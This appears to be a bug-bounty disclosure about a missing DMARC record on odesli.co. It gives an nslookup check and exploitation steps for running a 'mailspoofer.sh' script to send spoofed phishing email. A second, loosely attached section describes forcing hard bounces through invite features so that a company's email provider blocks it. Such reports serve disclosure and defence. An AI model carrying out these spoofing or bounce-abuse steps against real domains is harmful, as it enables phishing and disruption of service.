The DMARC record is not properly configured
--------------------------------------------->


https://bugcrowd.com/disclosures/d704c31e-96f7-4f41-83ed-739a92627421/the-dmarc-record-is-not-properly-configured

Confirmation of vulnerability steps:
First, open your Linux terminal, whether it's Kali or Parrot.
Next, use the nslookup command with the following command: 'nslookup -type=txt _dmarc.odesli.co '
Now you can see in there is not dmarc record found.
Which means that email's domain is vulnerable for spoofing.

Exploitation steps:
Save the attached email spoofing script to your Linux system.
Give command in kali or parrot : 'apt install postfix && apt install sendemail'
Provide executable permission to the script by running the following command: chmod +x mailspoofer.sh
Execute the script by using the following command, replacing receiver_email with the target recipient's email address: bash mailspoofer.sh receiver_email.
After executing mailspoofer.sh, you will be prompted to enter the email address where you want to send the phishing email. Input the email address you wish to target.

1. Email Bounce Issues

Check if Application has Invite Functionality
Try sending Invites to Invalid Email Accounts
Try to find Email Service Provider such as AWS SES , Hubspot , Campaign Monitor Note: You can find Email Service Provider by checking Email Headers
Once you have the Email Service Provider, Check there Hard Bounce Limits. Here are the limits for some of them:

1. Hubspot Hard bounces: HubSpot's hard bounce limit is 5%. For reference, many ISPs prefer bounce rates to be under 2%.

2. AWS SES: The rate of SES ranges from first 2-5% then 5-10%

Impact: Once the Hard Bounce Limits are reached, Email Service Provider will block the Company which means, No Emails would be sent to the Users !
